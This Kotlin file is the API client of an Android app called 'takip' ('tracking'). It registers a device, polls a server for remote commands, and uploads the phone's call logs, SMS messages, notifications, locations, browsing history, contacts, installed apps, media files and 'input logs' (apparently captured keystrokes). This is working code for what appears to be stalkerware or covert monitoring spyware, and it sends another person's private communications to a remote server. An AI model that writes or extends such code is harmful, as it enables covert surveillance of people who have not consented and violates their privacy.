package com.takip.app.api

import com.takip.app.BuildConfig
import com.takip.app.util.ConfigManager
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.logging.HttpLoggingInterceptor
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

object ApiClient {
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .apply {
            if (BuildConfig.DEBUG) {
                addInterceptor(HttpLoggingInterceptor().apply {
                    level = HttpLoggingInterceptor.Level.BODY
                })
            }
        }
        .build()

    private val jsonType = "application/json; charset=utf-8".toMediaType()

    data class DeviceRegisterResponse(
        val deviceId: String,
        val deviceToken: String,
        val userId: String,
        val menuPin: String? = null
    )

    data class SyncResponse(
        val commands: List<PendingCommand>,
        val menuPin: String? = null
    )

    data class PendingCommand(
        val id: String,
        val type: String
    )

    fun registerDevice(
        email: String,
        password: String,
        deviceName: String,
        androidId: String,
        manufacturer: String,
        model: String
    ): Result<DeviceRegisterResponse> = runCatching {
        val apiUrl = ConfigManager.getApiBaseUrl()
        val body = JSONObject().apply {
            put("email", email)
            put("password", password)
            put("deviceName", deviceName)
            put("androidId", androidId)
            put("apkVersion", BuildConfig.VERSION_NAME)
            put("manufacturer", manufacturer)
            put("model", model)
        }.toString()

        val request = Request.Builder()
            .url("$apiUrl/device/register")
            .post(body.toRequestBody(jsonType))
            .build()

        val response = client.newCall(request).execute()
        val responseBody = response.body?.string() ?: throw Exception("Boş yanıt")
        if (!response.isSuccessful) {
            val error = JSONObject(responseBody).optString("error", "Kayıt başarısız")
            throw Exception(error)
        }
        val json = JSONObject(responseBody)
        DeviceRegisterResponse(
            deviceId = json.getString("deviceId"),
            deviceToken = json.getString("deviceToken"),
            userId = json.getString("userId"),
            menuPin = json.optString("menuPin", null)
        )
    }

    fun sync(token: String, permissions: JSONObject): Result<SyncResponse> = runCatching {
        ConfigManager.refreshIfStale()
        val apiUrl = ConfigManager.getApiBaseUrl()
        val body = JSONObject().apply {
            put("permissions", permissions)
            put("manufacturer", permissions.optString("manufacturer"))
            put("model", permissions.optString("model"))
        }
        val request = Request.Builder()
            .url("$apiUrl/device/sync")
            .addHeader("Authorization", "Bearer $token")
            .post(body.toString().toRequestBody(jsonType))
            .build()
        val response = client.newCall(request).execute()
        val responseBody = response.body?.string() ?: throw Exception("Boş yanıt")
        if (!response.isSuccessful) throw Exception("Senkron hatası: ${response.code}")
        val json = JSONObject(responseBody)
        val commands = mutableListOf<PendingCommand>()
        val arr = json.optJSONArray("commands") ?: JSONArray()
        for (i in 0 until arr.length()) {
            val c = arr.getJSONObject(i)
            commands.add(PendingCommand(c.getString("id"), c.getString("type")))
        }
        SyncResponse(commands, json.optString("menuPin", null))
    }

    fun completeCommand(token: String, commandId: String, body: JSONObject): Result<Unit> =
        post(token, "/device/commands/$commandId/complete", body)

    fun post(token: String, path: String, data: JSONObject): Result<Unit> = runCatching {
        ConfigManager.refreshIfStale()
        val apiUrl = ConfigManager.getApiBaseUrl()
        val request = Request.Builder()
            .url("$apiUrl$path")
            .addHeader("Authorization", "Bearer $token")
            .post(data.toString().toRequestBody(jsonType))
            .build()

        val response = client.newCall(request).execute()
        if (!response.isSuccessful) {
            throw Exception("API hatası: ${response.code}")
        }
    }

    fun heartbeat(token: String): Result<Unit> = post(token, "/device/heartbeat", JSONObject())

    fun uploadCalls(token: String, calls: JSONArray): Result<Unit> =
        post(token, "/data/calls", JSONObject().put("calls", calls))

    fun uploadSms(token: String, messages: JSONArray): Result<Unit> =
        post(token, "/data/sms", JSONObject().put("messages", messages))

    fun uploadNotifications(token: String, notifications: JSONArray): Result<Unit> =
        post(token, "/data/notifications", JSONObject().put("notifications", notifications))

    fun uploadLocations(token: String, locations: JSONArray): Result<Unit> =
        post(token, "/data/locations", JSONObject().put("locations", locations))

    fun uploadAppUsage(token: String, usages: JSONArray): Result<Unit> =
        post(token, "/data/app-usage", JSONObject().put("usages", usages))

    fun uploadWebHistory(token: String, entries: JSONArray): Result<Unit> =
        post(token, "/data/web-history", JSONObject().put("entries", entries))

    fun uploadInputLogs(token: String, entries: JSONArray): Result<Unit> =
        post(token, "/data/input-logs", JSONObject().put("entries", entries))

    fun uploadInstalledApps(token: String, apps: JSONArray): Result<Unit> =
        post(token, "/data/installed-apps", JSONObject().put("apps", apps))

    fun uploadContacts(token: String, contacts: JSONArray): Result<Unit> =
        post(token, "/data/contacts", JSONObject().put("contacts", contacts))

    fun uploadMediaReturnUrl(token: String, file: java.io.File, type: String): Result<String> = runCatching {
        ConfigManager.refreshIfStale()
        val apiUrl = ConfigManager.getApiBaseUrl()
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("type", type)
            .addFormDataPart("timestamp", java.time.Instant.now().toString())
            .addFormDataPart("file", file.name, file.asRequestBody("image/jpeg".toMediaType()))
            .build()
        val request = Request.Builder()
            .url("$apiUrl/data/media")
            .addHeader("Authorization", "Bearer $token")
            .post(body)
            .build()
        val response = client.newCall(request).execute()
        val responseBody = response.body?.string() ?: throw Exception("Boş yanıt")
        if (!response.isSuccessful) throw Exception("Medya yükleme hatası: ${response.code}")
        val json = JSONObject(responseBody)
        file.delete()
        json.getString("fileUrl")
    }

    fun uploadMedia(token: String, file: java.io.File, type: String): Result<Unit> =
        uploadMediaReturnUrl(token, file, type).map { }
}
